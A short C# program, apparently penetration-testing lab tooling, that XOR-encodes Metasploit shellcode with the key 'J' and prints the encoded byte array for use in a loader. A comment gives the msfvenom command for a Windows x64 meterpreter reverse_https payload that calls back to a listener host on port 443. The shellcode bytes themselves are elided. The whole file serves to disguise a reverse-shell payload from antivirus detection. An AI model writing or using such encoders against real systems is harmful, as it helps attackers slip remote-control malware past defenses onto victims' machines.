using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {

            //msfvenom -p windows/x64/meterpreter/reverse_https lport=443 lhost=192.168.49.116 -f csharp EXITFUNC=thread
            byte[] buf = new byte[589] {0xfc, ... ,0xd5};

            // XOR-encrypt the shellcode
            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'J');
            }

            StringBuilder hex = new StringBuilder(buf.Length * 2);
            //foreach (byte b in buf)
            for (int i = 0; i < buf.Length; i++)
            {
                if (i != buf.Length - 1)
                {
                    hex.AppendFormat("0x{0:x2},", buf[i]);
                }
                else // no "," for the last line
                {
                    hex.AppendFormat("0x{0:x2}", buf[i]);
                }
                if ((i + 1) % 15 == 0)
                {
                    hex.AppendLine();
                }
            }
            Console.WriteLine("Encryption key is 'J'");
            Console.WriteLine($"byte[] buf = new byte[{buf.Length}] {{\n{hex.ToString()} }};");
        }
    }
}
